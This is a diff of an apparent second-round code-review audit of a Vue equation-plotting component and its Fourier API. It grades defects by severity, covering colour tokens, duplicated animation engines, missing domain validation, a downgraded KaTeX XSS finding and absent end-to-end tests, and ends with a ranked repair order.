+2. **`EquationView`'s coefficient popover is downstream of exactly that accident.** `useCoeffHover.ts:65` feeds `amber` into `{\color{…}a_k}` at `:79`/`:87`/`:92`. The same comment records the glass-ui-side rebaseline as "held as a coordination ask" — the day it lands and the local override retires, every coefficient in the popover renders grey. Untested, unwarned.
+
+**Corpus.** This is independently established by the facility-19 letter already in fourier's tree (`§3`, "four series painting the same grey"), which v1 does not cite. I corroborate it and add the `--section-color-5` link. **Corpus contradiction (both v1 and I agree, and I restate it with the sizing):** `CENSUS-2026-08-03.md:187-189` books F.W2 as deleting "the `colors.ts` hand-rolled arms (declared 3-line hex residual)". The *residual* is 3 lines; the **surface deleted is 5 functions / ~95 lines (`colors.ts:22-117`) with ~50 read sites and a live wrong-output defect on 4 of 5 tokens.** F.W2 reads like a formatting chore; it is a correctness repair and needs a colour-token witness.
+
+> **Falsifier.** (a) any `--viz-*` resolving to hex/hsl/rgb through the consumer cascade — `grep -rn -- "--viz-[a-z]*:" web/src` returns **only** `style.css:120,125` (`--viz-amber`) and `:121,126` (`--section-color-5`); fourier/chebyshev/legendre/green have no consumer override. (b) `getComputedStyle().getPropertyValue()` canonicalising custom properties — unregistered custom properties compute to the substituted token stream, and **both** shipped forms (`light-dark(oklch(…))` and the bare `oklch(…)` arms) fail all four regexes, so the claim holds under either resolution. **Not falsified.** The rendered-pixel outcome is `UNPROVEN-NEEDS-LIVE (SS-13)`; the returned string is proven from bytes.
+
+### C-30 — **NEW** · `useCurveTransition.ts` hand-rolls `lerp` on line 85 while line 8 imports the package that exports `lerp`
+
+**MAJOR — net new, and the cleanest F.W2 case in the tree.**
+
+```
+useCurveTransition.ts:8       import { easeInOutSine } from "@mkbabb/value.js";
+useCurveTransition.ts:85-87   export function lerp(a, b, t) { return a + (b - a) * t; }
+```
+
+`node_modules/@mkbabb/value.js/dist/index.d.ts` line 20:
+`export { clamp, scale, lerp, lerpArray, logerp, deCasteljau, cubicBezier, … } from './math';`
+
+The local `lerp` is imported by `ConvergencePlot.vue:11` and used at `:120`, `:135`, `:137`, `:170`, `:171` — five call sites re-implementing a primitive the file's **own import line** already reaches. Unlike the colour arm (D-16), there is no oklch-shaped excuse: `dist/value.js` defines `lerp = (a, b, t) => a + (b - a) * t` — byte-identical semantics.
+
+Together with D-10 this is the shape of the consumption: one value.js symbol imported three times across the closure, and the primitives sitting beside it in the same barrel re-authored by hand.
+
+> **Falsifier.** A differing signature (clamped `t`, array-valued). It is identical. **Not falsified.**
+
+### C-31 — **NEW** · keyframes.js is a pinned dependency with its own bundle chunk and **zero** consumption here — while the closure runs **two** hand-rolled rAF engines
+
+**MAJOR — net new. This supersedes v1's AMBER grade for keyframes (§5 of v1), which considered only the CSS-transition surface and missed the rAF engines.**
+
+`web/package.json:11` pins `"@mkbabb/keyframes.js": "^4.3.0"`; `vite.config.ts:44-56` cuts it a dedicated `vendor-keyframes` chunk. `grep -rn "keyframes.js" web/src` → exactly two hits, **both outside this closure** (`composables/useFourierMorph.ts:14`, and a *comment* at `stores/animation.ts:47`).
+
+Meanwhile the closure contains two independent hand-written rAF animation engines:
+
+- `ConvergencePlot.vue:57-75` — a full ping-pong playback loop (`loopStartTime`, cycle/frac derivation, `t = cycle % 2 === 0 ? frac : 1 - frac`, manual `cancelAnimationFrame`), plus scrub start/move/end (`:282-291`) and a play toggle (`:274-278`).
+- `composables/useCurveTransition.ts:34-53` — a second 500 ms rAF tween with its own `performance.now()` baseline, its own cancel closure, its own easing application.
+
+They are mutually unaware: `ConvergencePlot.vue:308-317` cancels the transition but the playback loop keeps running, so during a data change **both engines call `draw()` on the same canvas in the same frame**. Timeline ownership, cancellation and reduced-motion gating all had to be re-derived twice.
+
+Consumption-relevant note (axis D owns the a11y litigation, per v1's deferral): `ConvergencePlot.vue:323-327` autoplays on mount with no `prefers-reduced-motion` gate, in a file that *does* gate a 0.1 s tooltip fade at `:405-409` — and `EquationView.vue:308-317` is the mount that starts it, with no gating prop. Corroborates the census F.W4 sketch line "reduced-motion clock gating" with a named site.
+
+> **Falsifier.** keyframes 4.3 being unable to express a scrubbable ping-pong timeline. The repo's own `useFourierMorph.ts:9` header states "All transitions are driven by keyframes.js `Animation` instances" — the capability is demonstrated **in this tree**. **Not falsified.**
+
+### C-32 — **NEW** · no domain precondition on either side of the seam; a degenerate domain is a 500 server-side and NaN client-side
+
+**MAJOR — net new.**
+
+`FunctionInput.vue:44-60` (`parseDomainValue`/`onDomainInput`) accepts **any** finite number for either endpoint: no ordering check, no `start !== end` check. `EquationView.vue:26-27` holds them as bare refs; `:105-106` posts them raw. `api/models/equations.py:18-19` declares `domain_start: float = 0.0` / `domain_end: float = Field(default=6.283…)` — **no validator, no cross-field constraint**.
+
+With `domain_start == domain_end`, `api/routers/equations.py:55` computes `period = 0` and every downstream coefficient path divides by it; the failure lands in `api/main.py:114-122`'s catch-all as `500 {"detail": "Internal server error"}` — which D-02 then renders as nothing. Client-side the same input poisons the plot before any response: `ConvergencePlot.vue:104` `omega = 2π/(domB − domA)` → `Infinity`; `:178-181`'s `toScreen` divides by `(maxX − minX)` → `NaN` for every point; the canvas silently blanks. With `domain_start > domain_end` the request *succeeds* and returns a series over a negative period — no error at any layer.
+
+> **Falsifier.** A validator on either side. `grep -n "validator\|model_validator\|@field" api/models/equations.py` → nothing; `grep -n "domainStart\|domainEnd"` across `EquationView.vue` + `FunctionInput.vue` → assignment and formatting only. **Not falsified.** The exact 500 throw point is `UNPROVEN-NEEDS-LIVE`; the absence of any guard on either side is proven.
+
+### D-28 — zero functional e2e on `/equation` *(v1 MINOR → v2 MAJOR)*
+
+**FOLDED + PROMOTED.** `web/e2e/` holds 8 specs — contour-extraction, gallery, paper-performance, settings-persistence, visual-baseline, visualization-crud, visualization-ux, workspace-flow. `grep -rln "equation" web/e2e/` returns **one** file: `visual-baseline.spec.ts:34` (`{ slug: "equation", path: "/equation" }`), a screenshot/axe route entry at 375 / 1280 / 1440 — no viewport in D-13's 1023–1024 band, and no interaction with any control audited here. (`settings-persistence.spec.ts:65-100`'s "Harmonics" spinbutton is the *contour* control in the visualization workspace, not this component.)
+
+**Promotion rationale.** All five blockers above are `vue-tsc`-clean; none is reachable by any gate this repo runs. That is not a MINOR coverage gap, it is the mechanism by which five blockers reached the working tree. Concrete instance of census risk 10 (vitest ABSENT; only `vue-tsc` + single-chromium Playwright).
+
+---
+
+## §4 — MINOR (13)
+
+**Folded intact from v1:** **D-18** hand-inlined lucide `info` SVG beside the imported `Info` · **D-19** two unlinked magic `500`s across the seam · **D-20** one hand-rolled v-model among six `v-model:` · **D-21** unearned optionality on four always-passed props · **D-22** `:disabled="!effectiveN"` can never fire · **D-23** `SegmentedTabs`' `string` model forces the union cast (producer-side; **owes a glass-ui BH relay**) · **D-24** `SegmentedTabs.responsive` unused · **D-25** two shadow idioms in one file · **D-26** stale citation `:61` vs `:59` · **D-27** `lucide-vue-next` runtime import declared in `devDependencies`.
+
+### D-03 — **CORRECTED, BLOCKER → MINOR** · the `trust:true` sites are not the user-input site
+
+v1 graded this BLOCKER on the claim that user-typed `expression` reaches a `trust:true` KaTeX renderer and then `v-html`. **The tree disagrees.**
+
+`grep -rn "trust" web/src/components/equation/` returns **exactly two** hits:
+
+- `EquationResult.vue:23` — renders `activeLatex`, which comes from the API or the session cache.
+- `useCoeffHover.ts:100` — renders locally-built numeric strings (`toFixed`).
+
+The **only** site that interpolates the raw user expression is `ConvergencePlot.vue:263-264`, and its renderer is `renderKatexInline` at `:255-258`:
+
+```
+katex.renderToString(latex, { throwOnError: false, displayMode: false });
+```
+
+— **no `trust` option**, so it takes KaTeX's documented default `false`, and `\href` / `\url` / `\includegraphics` are disabled there. v1's own falsifier conceded the two `trust:true` legs are server/numeric-fed and then asserted "the ConvergencePlot leg is client-string interpolation and is **not** falsified". It is falsified: that leg has `trust` off.
+
+Server-side closes it further: `src/fourier_analysis/symbolic/parsing.py:17-52` parses under a restricted namespace and the LaTeX is rendered from numeric terms, not echoed input.
+
+**What genuinely survives, at MINOR:** (a) `trust: true` on two sites is a permissive default nobody needs — KaTeX's documented mitigation is a protocol-filtering `handler`; (b) `ConvergencePlot.vue:257`'s `catch { return latex; }` returns the **raw user string** into `v-html="tooltipHtml"` (`:353`), and (c) `EquationResult.vue:26-27`'s fallback interpolates raw latex into HTML **unescaped**: `` `<code>${props.latex}</code>` ``. Both catch-paths require KaTeX to throw a non-`ParseError`, which is not demonstrated. Graded MINOR, defense-in-depth, reachability `UNPROVEN-NEEDS-LIVE`.
+
+> This is the row where L-18 cut against the prior challenge rather than against the component.
+
+### C-33 — **NEW** · `MetricBadge` receives a label through the `unit` axis
+
+`EquationView.vue:292-297` passes `unit="% energy"`. glass-ui separates the axes: `unit?: string` vs `label?: string` + `labelPosition?: 'inline' | 'stacked'` (`dist/components/custom/metric-badge/MetricBadge.vue.d.ts:6-24`). "energy" is a label smuggled through the unit slot, so the badge's own typographic treatment of labels (tracked uppercase, muted, sibling `<span>` with `metric-badge__label` classnames) is bypassed and the consumer gets one undifferentiated run of text.
+*Falsifier:* `label` requiring something unavailable here — it does not; `labelPosition: 'inline'` is the documented single-row mode. **Not falsified.**
+
+### C-34 — **NEW** · the 429 retry adds up to ~3 s of invisible latency on a saturated compute queue
+
+`lib/api.ts:172-178` retries 429 up to twice, reading `RateLimit-Reset`. fourier's compute 429 is raised by `api/services/computation.py:35-39` as a bare `HTTPException(status_code=429, detail="Compute queue saturated, try again shortly")` — **no `RateLimit-Reset` header**, so `readRateLimitResetSeconds` returns null and the client falls back to `2**attempt` = 1 s + 2 s. Under queue saturation the user waits ~3 s and then, on the simplify path, receives D-01/D-02's silence.
+*Falsifier:* the 429 setting the header. `HTTPException(...)` sets none. **Not falsified.**
+
+---
+
+## §5 — INFO (3)
+
+- **C-35** — `eqCardRef` uses `ref<HTMLDivElement>()` + `ref="eqCardRef"` (`:46`, `:250`) rather than Vue 3.5's `useTemplateRef`. *(I first flagged `:252` `onCoeffMove(e, eqCardRef)` as passing the Ref rather than the element — **that is wrong**: `<script setup>` top-level refs auto-unwrap in template expressions. Recorded because the falsifier killed the finding.)*
+- **C-36** — `easeInOutSine` is applied at **three** nesting levels across three modules: `ConvergencePlot.vue:34` (`easedT`), again inside `harmonics.ts:74` on the local fraction of that already-eased value, and a third time on transition progress at `useCurveTransition.ts:46`. Composed easing is defensible; three independent imports of one primitive with no shared timing contract is D-10/C-30 in miniature.
+- **C-37** — `:314` `:domain="[domainStart, domainEnd]"` allocates a fresh array every render. Harmless today (`ConvergencePlot` reads it imperatively in `draw()` and does not watch it) but one `watch(() => props.domain)` from an infinite loop — and `:308` already runs a `{ deep: true }` watcher over ~1000 floats on the sibling props.
+
+---
+
+## §6 — SUPERLATIVES (6; L-18 runs both ways)
+
+**S-01 · The E.W5 fetch-core collapse retired two casts structurally, and committed the reasoning next to the code.** `lib/equation/api.ts:1-12` records that the local `eqFetch` was deleted for the shared `apiFetch`, and that the two `as unknown as` casts retired *because the core's `body` axis was widened* — not because someone deleted the word `as`. Verified: `grep -rn "as unknown as" web/src/lib/equation web/src/components/equation` → 1 hit, and it is the prose in that header. *Falsifier: a `body` type still requiring a cast — `lib/api.ts:89-92` types `body?: FormData | BodyInit | object`. **Survives**, with D-15's caveat (a third, self-inflicted cast at `:49`).*
+
+**S-02 · `useCoeffHover` is a correct, minimal extraction with the right DOM strategy.** 106 lines of KaTeX rendering + hit-testing behind a two-in/five-out contract, consumed in two lines (`:75-76`). **One** delegated `mousemove` on the card (`:252`) with `closest(".eq-coeff")` — not N listeners on N KaTeX spans that KaTeX re-creates on every render — and card-relative coordinates via two `getBoundingClientRect`s, so it survives scrolled/transformed ancestors. *Falsifier: per-span listeners or scroll-fragile positioning. Neither. **Survives**, with D-16's caveat.*
+
+**S-03 · A genuine reactive-ordering hazard is documented at the exact line where it bites.** `:116-119` captures `lastDisplayKey` **before** assigning `effectiveN`, because that assignment synchronously fires `vizHarmonics` → the `:151` watcher → `budget`. The comment names the mechanism, not the symptom. *Falsifier: swap the two lines and `displayKey()` reads the mutated `budget`, suppressing a needed re-render at `:133`. **Survives**, with D-06's caveat (the same capture breaks on the notation-mid-flight axis).*
+
+**S-04 · The client names the server's sampling convention and cites its source line.** `ConvergencePlot.vue:113-115` and `:123-129` explain why the partial-sum grid is `endpoint=false` while the original curve gets an appended wrap sample, citing `api/routers/equations.py`. Verified: `equations.py:59` `np.linspace(domain[0], domain[1], req.n_eval_points, endpoint=False)`. A client documenting *why* its geometry differs from the payload's, with a pointer into the server, is exactly the client↔operation join R6-8 says must exist somewhere. *Falsifier runs and nicks it: the citation reads `:61`; the statement is at `:59` (D-26) — precisely the pin-hygiene rule the census books at F.W0.*
+
+**S-05 · NEW · The cross-repo resolution posture is contract-v2 clean, and says why.** `vite.config.ts:20-26` carries **no** `@mkbabb/*` dist alias and cites the governing precept by section (`cross-repo-dev-resolution.md §2.2/§2.4`); `:63-66` declines the sibling-`src` `fs.allow` widening for the same reason. Independently confirmed at `lane-frontend.md:45`, and it matches value.js's own posture. This is load-bearing for this axis: a consumer that resolves siblings **only** through their published `exports` maps is why D-10's bare-specifier break will surface loudly at uplift instead of being silently aliased away. *Falsifier: any alias or `fs.allow` entry — `grep -n "alias\|fs\." web/vite.config.ts` → only `"@" → ./src`. **Survives.***
+
+**S-06 · NEW · Abort is distinguished from failure at every catch.** `:122` and `:143` both guard with `isAbortError(e)` before touching error state, against the per-key `AbortController` registry at `lib/api.ts:52-59`. The component never reports a self-inflicted cancellation as a user-facing error — a discipline most fetch-consuming components skip entirely. *Falsifier: an unguarded catch on an abortable path — there is none in the closure. **Survives** — but note the falsifier's sting: it is precisely this correct-looking guard at `:143` that makes D-01/D-02's total silence read as deliberate.*
+
+---
+
+## §7 — CONSUMPTION VERDICT PER PRODUCER
 
 | producer | pinned / installed | this seat's surface | verdict |
 |---|---|---|---|
-| **value.js** | `^0.13.0` / `0.13.0` | 0 direct imports; **3 bare-root specifiers in the import closure** (D-10), all for `easeInOutSine`; the hand-rolled `colors.ts` arm reached via `useCoeffHover` (D-16) | **RED.** Peer range already violated by the installed pair (D-11, contradicting the corpus). The F.W1 root-export deletion breaks the plot subtree. F.W2's scope must widen past "3-line hex residual". |
-| **keyframes.js** | `^4.3.0` / `4.3.0` | **zero** — 8 hand-authored CSS transitions (`:444-452`) on glass-ui motion tokens, plus one globally-cascaded `tooltip-in` keyframe (`:466`) | **AMBER.** Not a defect per se (CSS transitions are the right tool for 4 discrete states), but the seat is a pure non-consumer of a pinned dependency, and its one keyframe use rides an undeclared global cascade from glass-ui's `animations.css`. Token drift: `:466` uses `--ease-out-expo` for `tooltip-in` while `ConvergencePlot.vue:402` uses `--ease-standard` for the same keyframe. Both tokens resolve (`glass-ui/dist/styles/tokens/scheme-motion.css`). |
-| **glass-ui** | `^4.0.0` / `4.0.0` | 4 imports (`Button`, `HoverCard`, `MetricBadge`, `SegmentedTabs`); **2 on the deletion list** (D-12); `HoverPopover` reimplemented by hand (D-08); `.cartoon-card` × 5 on a consumer resurrection shim (D-09); `responsive` unused (D-24) | **RED.** This is the deepest consumption debt in the component. Two removed primitives + one deleted recipe class + one ignored surviving component. |
-| **fourier API** (2 of 45 ops) | `POST /api/equations/compute`, `POST /api/equations/simplify` | client edges exist for both; contract fidelity does not | **RED.** Range mismatch (D-01), no problem+json envelope (D-02), racing abort keys (D-06), a response field the sigma view needs and the operation does not return (D-05), dead payload (D-14), foreign-type wrapper (D-15), duplicated magic constant (D-19). |
+| **value.js** | `^0.13.0` / `0.13.0` | 0 direct imports; **3 of the repo's 5 bare-root specifiers in the closure** (D-10), all for `easeInOutSine`; `lerp` re-authored beside the import that exports it (C-30); the hand-rolled `colors.ts` arm reached via `useCoeffHover` (D-16) | **RED.** Peer edge already unmet (D-11, contradicting the corpus); the pin is held from below by keyframes' hard dep. 4 of 5 `--viz-*` tokens resolve to grey **today**, not post-uplift. F.W2's scope must widen past "3-line hex residual". |
+| **keyframes.js** | `^4.3.0` / `4.3.0` | **zero** — while the closure runs two hand-rolled rAF engines and 8 hand-authored CSS transitions | **RED** *(v2 downgrades v1's AMBER — see C-31).* A pinned dependency with a dedicated bundle chunk and no consumer, in a closure that re-derived its core capability twice. |
+| **glass-ui** | `^4.0.0` / `4.0.0` | 4 imports (`Button`, `HoverCard`, `MetricBadge`, `SegmentedTabs`); **2 on the deletion list** (D-12); `HoverPopover` reimplemented by hand in a global stylesheet (D-08); `.cartoon-card` × 5 on a resurrection shim (D-09); `responsive` unused (D-24); `unit` carrying a label (C-33) | **RED.** The deepest consumption debt in the component — two removed primitives, one deleted recipe class, one ignored surviving component. Subpath discipline itself is good (4/4 exact subpaths here; 8/10 across the closure). |
+| **fourier API** (2 of 45 ops) | `POST /api/equations/{compute,simplify}` | client edges exist for both; contract fidelity does not | **RED.** Range mismatch (D-01), no problem+json envelope and the server's diagnostic destructured away (D-02), a control inert in the default view because the response lacks the field (D-05), racing abort keys (D-06), no domain precondition on either side (C-32), dead payload (D-14), foreign-type wrapper (D-15), duplicated magic constant (D-19), invisible 429 backoff (C-34). |
+
+**R6-8 instantiation, restated for F.W5.** The equation pair is the **inverse** of intake R6-8's C31 case, and that is the useful part. R6-8 failed because `operation:PATCH:/api/visualizations/{slug}` embeds `clients: ["client:updateVisualization"]`, so a client-side edit mutated both leaves and the defect was unattributable. Here the client leaves live in a **separate** module (`lib/equation/api.ts`) with no back-reference, so D-01 *is* cleanly attributable: the client emits an out-of-range `budget`; the operation's `le=50` is correct and unchanged. **That legibility is the property F.W5's shared-provenance contract should preserve — operation identity independent of client identity, the join in a separate relation** (the ADDENDUM's F.W5 carry). D-19's twin `500`s are the counter-example: a constraint duplicated across the seam with no join at all is equally unattributable, from the other direction.
 
 ---
 
-## §6 — Ranked repair order (cheapest-first within severity)
+## §8 — RANKED REPAIR ORDER
 
-1. **D-01** clamp `budget` to `Math.min(50, …)` at the slider's `:max` *and* in the `:151` watcher — 2 lines; or lift `le=50` to a shared constant across the seam (the R6-8-correct fix).
-2. **D-05** add `latex_sigma` to `SimplifyResponse` (both models) and write it in `doSimplify` — the notation control becomes live.
-3. **D-04** guard `result.value.coefficients` at `:61` (`?.coefficients ?? []`, matching the already-correct `:72`) and validate `loadCachedResult`'s shape.
-4. **D-02** either give `/api/equations/*` the problem+json envelope the rest of the API has, or read `.detail`/`.status` and fall back to a non-empty literal at `:123`.
-5. **D-03** replace `trust: true` with a protocol-filtering handler at all three KaTeX sites (KaTeX's own documented mitigation).
-6. **D-06** share one abort key across both equation operations, or add a generation counter around `displayLatex`.
-7. **D-10** three-line rewrite to `@mkbabb/value.js/easing` — the cheapest leg of F.W1/F.W2, entirely inside this closure.
-8. **D-08 / D-12** `HoverCard` + the global `.info-hovercard` block → `<HoverPopover>`; `MetricBadge` → `Metric` at the 7.0.0 hop.
-9. **D-14 / D-17** drop `reconstructed_points` from the response (or read it and delete the client's duplicate reconstruction); stop re-writing the cache on simplify.
-10. **D-13** one breakpoint token shared by JS and CSS; `1023.98px` or `not all and (min-width: …)`.
-11. **D-07 / D-18 / D-26** delete `loading`, delete the inline SVG, fix the citation.
-12. **D-28** the whole list above is invisible to CI. One interaction spec covering compute → notation → budget → cache-restore would have caught D-01, D-05, D-07 and D-14 mechanically.
+1. **D-01** clamp `budget` to `min(50, …)` at the slider's `:max` *and* in the `:151` watcher — 2 lines; or lift `le=50` to one constant shared across the seam (the R6-8-correct fix).
+2. **C-29** give `CachedResult` a compute key and compare it at `:79`/`:174`; or write both records atomically. Fixes the desync *and* removes D-06's poisoned-write consequence.
+3. **D-05** add `latex_sigma` to `SimplifyResponse` (both models) and write it in `doSimplify` — the Notation control becomes live.
+4. **D-04** guard `result.value.coefficients` at `:61` (match the already-correct `:72`) and shape-validate `loadCachedResult`.
+5. **D-02** give `/api/equations/*` the problem+json envelope the rest of the API has, **and** stop discarding array-shaped `detail` in `api-problem.ts:38-47`; read `.detail`/`.status` at `:123` with a non-empty fallback.
+6. **C-32** add `domain_end > domain_start` as a pydantic `model_validator` **and** a client precondition.
+7. **D-06** one shared abort key across both equation operations, or a generation counter around `displayLatex`.
+8. **D-10 / C-30** three-line rewrite to `@mkbabb/value.js/easing`; delete the local `lerp`. The cheapest leg of F.W1/F.W2, entirely inside this closure.
+9. **D-16** delete the `colors.ts` arms per facility-19 §5.2 — with a colour-token witness, because 4 of 5 tokens are grey today.
+10. **D-08 / D-12** `HoverCard` + the global `.info-hovercard` block → `<HoverPopover>`; `MetricBadge` → `Metric` at the 7.0.0 hop.
+11. **C-31** retire one of the two rAF engines onto keyframes.js, and gate the clock on `prefers-reduced-motion`.
+12. **D-14 / D-17** drop `reconstructed_points`; stop re-writing the whole cache on simplify.
+13. **D-13** one breakpoint token shared by JS and CSS; `1023.98px` or `not all and (min-width: …)`.
+14. **D-07 / D-18 / D-26 / D-03** delete `loading`; delete the inline SVG; fix the citation; replace `trust: true` with a protocol-filtering handler.
+15. **D-28** every item above is invisible to CI. **One** interaction spec covering compute → notation → budget → reload-restore would have caught D-01, D-05, D-07, D-14 and C-29 mechanically.
+
+---
+
+## §9 — CORPUS RECONCILIATION
+
+| corpus row | v2 |
+|---|---|
+| `lane-frontend.md:130` — EquationView 469 lines, `/equation` route shell | **AGREE**, exact. |
+| `lane-frontend.md:263-266` — the 4 glass-ui subpath imports | **AGREE.** Extended: 8 subpath / 2 barrel across the closure (`EquationResult.vue:4` and `CollapsibleSection.vue:2` use the root barrel; `./dom` and `./collapsible` both ship the needed symbols at 4.0.0). |
+| `lane-frontend.md:472-473` — `./metric-badge` removed at 7.0.0; `./hover-card` at 5.0.0 | **AGREE** (D-12). EquationView carries 2 of the 4 glass-7-breaking imports on this route — the highest concentration in one file. |
+| `lane-frontend.md:480` + facility-19 **I-1** — 5 value.js bare specifiers; bare specifier retired at 4.0.0 | **AGREE, re-scoped** (D-10): **3 of the 5** are in this closure, all one symbol. |
+| facility-19 **§3** — "four series painting the same grey" | **AGREE, corroborated independently** from the installed `dist/`. **Adds:** `--section-color-5` (behind `--viz-amber`) is also oklch, so the popover's colour is load-bearing on the unrelated `D.W4.d` WCAG override (D-16). |
+| `CENSUS-2026-08-03.md:187-189` — F.W2 = "delete the arms (declared 3-line hex residual)" | **CONTRADICT the framing.** 5 functions / ~95 lines / ~50 read sites / live wrong output on 4 of 5 tokens. Specify F.W2 as a correctness repair with a witness. |
+| `CENSUS-2026-08-03.md` "latent, not live" + `lane-frontend.md:480` | **CONTRADICT** (D-11, v1's find): the glass-ui 4.0.0 → value.js 0.13.0 peer edge is unmet **today**. **Correcting v1:** the peer is `optional`, so it warns rather than fails. **Adding:** keyframes@4.3.0 hard-deps `value.js ^0.13.0` — the pin is held from below. |
+| `CENSUS-2026-08-03.md:193-195` — F.W4 "reduced-motion clock gating" | **AGREE + instance:** `ConvergencePlot.vue:323-327` autoplays ungated while `:405-409` gates a 0.1 s fade (C-31). |
+| census risk 10 — "uplift lands with no unit-test net" | **AGREE + instance:** `/equation` has zero functional e2e; all 5 blockers are `vue-tsc`-clean (D-28, promoted). |
+| intake **R3-7a** — 35 Tooltip callsites / 9 consumers, `FunctionInput` = 2 | **AGREE, re-verified live:** `FunctionInput.vue:157` and `:188` — exactly 2, via the local adapter `components/ui/tooltip/index.ts`. |
+| intake **X-3** — 45 / 30 public-non-admin / 13 admin | **AGREE.** This seat owns 2 of the 45, both public-non-admin. |
+| intake **R6-8** — operation identity must be independent of client identity | **CITED and INVERTED** — see §7. The equations pair has no back-reference, so D-01 is cleanly attributable; that is the property F.W5 must preserve. D-19 is the counter-example from the other direction. |
+| intake **X-4** — HEAD `cd26c653…` | **AGREE, re-verified today**; `EquationView.vue` is among the dirty in-scope paths. |
+
+---
+
+## §10 — VERDICT
+
+`EquationView` consumes glass-ui with real subpath discipline and value.js almost not at all; its own reactive reasoning is careful in the small (S-03) and unsound in the large. Five states ship broken with no recovery signal: a slider that walks `budget` past a bound the client never learned, an error path that renders the empty string, a cache that presents last session's Fourier series under this session's function, a Notation control that is inert in the default view, and an unvalidated cache parse that blanks the route. Every one of them is invisible to every gate this repo runs.
+
+The v1 challenge found four of the five and got the mechanisms right; this v2 adds the fifth, corrects an overstated XSS blocker, and moves the colour defect from "a risk F.W1 brings" to "a defect shipping today".
